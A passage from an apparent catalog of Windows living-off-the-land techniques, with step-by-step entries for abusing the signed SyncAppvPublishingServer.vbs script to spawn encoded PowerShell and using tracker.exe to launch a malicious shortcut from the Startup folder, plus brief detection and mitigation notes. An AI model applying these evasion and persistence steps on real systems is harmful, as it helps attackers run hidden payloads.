- **Attack Steps**: 1. Locate the signed VBS file, typically found at: C:\ProgramData\Microsoft\AppV\Client\SyncAppvPublishingServer.vbs. 2. Identify where within the script you can influence execution—e.g., passing it arguments that are processed by internal calls. 3. Use a command like: wscript.exe SyncAppvPublishingServer.vbs -url powershell -e <payload>. 4. The signed script processes the input and indirectly spawns PowerShell using attacker-supplied arguments. 5. This evades many AV/EDR rules because the initial script is signed by Microsoft. 6. Useful in defense evasion during lateral movement or privilege escalation.
- **Detection**: Monitor arguments passed to trusted scripts
- **Solution**: Disable legacy signed scripts
- **Tags**: #LOLBins #AppV #VBSProxy #SyncAppv

## Tracker.exe Used for LNK-Based Payload Launch

- **Attack Type**: LNK Execution via Tracker
- **Target**: User Workstations
- **Vulnerability**: Execution of unvalidated shortcuts
- **MITRE**: T1204.002 – Malicious File
- **Impact**: Executes payload via shell link and trusted binary
- **Tools**: tracker.exe, .lnk file
- **Scenario**: Uses tracker.exe to run malicious .lnk files pointing to attacker-controlled scripts.
- **Attack Steps**: 1. Create a .lnk shortcut file using tools like Shortcut.exe or manually via Windows GUI. 2. Set the link's target to something like powershell.exe -Command Invoke-Expression(...). 3. Place the .lnk file in a user-accessible folder (e.g., %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup). 4. Use tracker.exe to launch the shortcut with: tracker.exe <path>\evil.lnk. 5. The shortcut executes via the signed tracker.exe, avoiding typical script detections. 6. Because .lnk files are often overlooked, this technique can persist across reboots if placed in startup.
- **Detection**: Monitor tracker.exe with unknown paths
- **Solution**: Restrict .lnk execution outside trusted folders
- **Tags**: #LOLBins #Tracker #LNKAbuse #StealthPersistence

